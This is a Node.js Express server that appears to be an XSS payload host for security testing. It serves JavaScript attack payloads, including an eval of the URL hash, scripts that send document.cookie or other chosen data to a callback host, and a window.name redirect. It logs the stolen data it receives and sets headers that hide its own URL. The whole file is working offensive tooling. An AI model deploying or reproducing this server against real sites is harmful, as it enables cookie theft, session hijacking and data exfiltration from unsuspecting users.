const express = require('express');
const morgen = require('morgan');

const PORT = process.env.PORT ?? 3000;
const HOST = process.env.HOST ?? '127.0.0.1';
const PREFIX = process.env.PREFIX ?? '/';

const app = express();
app.use(morgen('dev'));

const FETCH_DEST_SCRIPT = new Set(['script', 'audioworklet', 'paintworklet', 'serviceworker', 'sharedworker', 'worker']);
const FETCH_DEST_HTML = new Set(['document', 'embed', 'frame', 'iframe', 'object']);

const ResponseTypes = {
    HTML: 'html',
    SCRIPT: 'script',
    PLAIN: 'plain',
};

function determineResponseType(req) {
    if ('type' in req.query || 't' in req.query) {
        const type = req.query.type ?? req.query.t;
        return type;
    }

    if (/\.\w+$/.test(req.path)) {
        const extension = /\.(\w+)$/.exec(req.path)[1];
        switch (extension) {
            case 'html':
            case 'htm':
                return ResponseTypes.HTML;
            case 'js':
                return ResponseTypes.SCRIPT;
            default:
                return ResponseTypes.PLAIN;
        }
    }

    if (req.get('sec-fetch-dest')) {
        const secFetchDest = req.get('sec-fetch-dest');
        if (FETCH_DEST_HTML.has(secFetchDest)) {
            return ResponseTypes.HTML;
        } else if (FETCH_DEST_SCRIPT.has(secFetchDest)) {
            return ResponseTypes.SCRIPT;
        } else {
            return ResponseTypes.PLAIN;
        }
    }

    if (req.get('accept')) {
        const accept = req.get('accept');
        for (const type of accept.split(',')) {
            switch (type) {
                case 'text/html':
                    return ResponseTypes.HTML;
                case 'application/javascript':
                    return ResponseTypes.SCRIPT;
                case 'text/plain':
                    return ResponseTypes.PLAIN;
            }
        }
    }

    return ResponseTypes.PLAIN
}

function sendPayload(req, res, payload) {
    console.log(`${req.method} ${req.url}`);
    console.log(`  host=${req.get('host') ?? ''}`);
    console.log(`  referrer=${req.get('referer') ?? ''}`);
    console.log(`  origin=${req.get('origin') ?? ''}`);
    if ('data' in req.query) {
        console.log(`  data=${req.query.data ?? ''}`);
    }

    let mime;
    let finalPayload;
    switch (determineResponseType(req)) {
        case ResponseTypes.HTML:
            mime = 'text/html';
            finalPayload = `<script>${payload}</script>`;
            break;
        case ResponseTypes.SCRIPT:
            mime = 'application/javascript';
            finalPayload = payload;
            break;
        case ResponseTypes.HTML:
        default:
            mime = 'text/plain';
            finalPayload = payload;
            break;
    }

    res.set('Content-Type', mime);
    res.send(finalPayload);
}

function getFullURL(req) {
    const protocol = req.get('x-forwarded-proto') ?? req.protocol;
    const host = req.get('host') ?? `${HOST}:${PORT}`;
    return new URL(`${protocol}://${host}${req.originalUrl}`);
}

const jsonify = (...args) => JSON.stringify(...args).replaceAll('</script', '<\\/script');

const PAYLOADS = new Map(Object.entries({
    default: 'alert(origin)',
    hash: 'eval(decodeURIComponent(location.hash.slice(1)))',
    cookie(req) {
        let callback;
        if ('callback' in req.query || 'cb' in req.query) {
            callback = req.query.callback ?? req.query.cb;
        } else {
            const url = getFullURL(req);
            url.search = '';
            callback = url.toString();
        }

        return `fetch(${jsonify(callback)}+'?data='+escape(document.cookie))`;
    },
    fetch(req) {
        let callback;
        if ('callback' in req.query || 'cb' in req.query) {
            callback = req.query.callback ?? req.query.cb;
        } else {
            const url = getFullURL(req);
            url.search = '';
            callback = url.toString();
        }

        let extract;
        if ('extract' in req.query || 'ex' in req.query) {
            extract = req.query.extract ?? req.query.ex;
        } else {
            extract = 'document.cookie';
        }

        return `fetch(${jsonify(callback)}+'?data='+escape(${extract}))`;
    },
    name(req) {
        const { name, url } = req.query;
        return `window.name=${jsonify(name)};location.href=${jsonify(url)}`;
    },
}));

const PAYLOAD_REGEX = /^\/(\w+)(?:[\/.]|$)/;

function getPayload(req) {
    let name;
    if ('payload' in req.query || 'p' in req.query) {
        name = req.query.payload ?? req.query.p;
    } else if (PAYLOAD_REGEX.test(req.path)) {
        name = PAYLOAD_REGEX.exec(req.path)[1];
    } else {
        name = 'default';
    }

    const payload = PAYLOADS.get(name);
    if (typeof payload === 'string') {
        return payload;
    } else if (typeof payload === 'function') {
        return payload(req);
    } else {
        return name;
    }
}

function setHeaders(req, res) {
    // make sure the response can be used
    res.set('access-control-allow-origin', '*');
    res.set('cross-origin-resource-policy', 'cross-origin');
    res.set('cross-origin-embedder-policy', 'unsafe-none');
    // make sure this tool's URL does not get leaked
    res.set('referrer-policy', 'no-referrer');

    const headers = req.query.headers ?? req.query.h;
    if (typeof headers === 'object') {
        for (const [name, value] of Object.entries(headers)) {
            res.set(name, value);
        }
    }
}

const static = express.static('./payloads');

app.use(PREFIX, (req, res, next) => {
    setHeaders(req, res);

    if (req.url.startsWith('/p/')) {
        req.url = req.url.replace('/p', '');
        static(req, res, next);
        return;
    }

    sendPayload(req, res, getPayload(req));
});

app.listen(PORT, HOST, () => {
    console.log(`Listening on ${HOST}:${PORT}`);
});
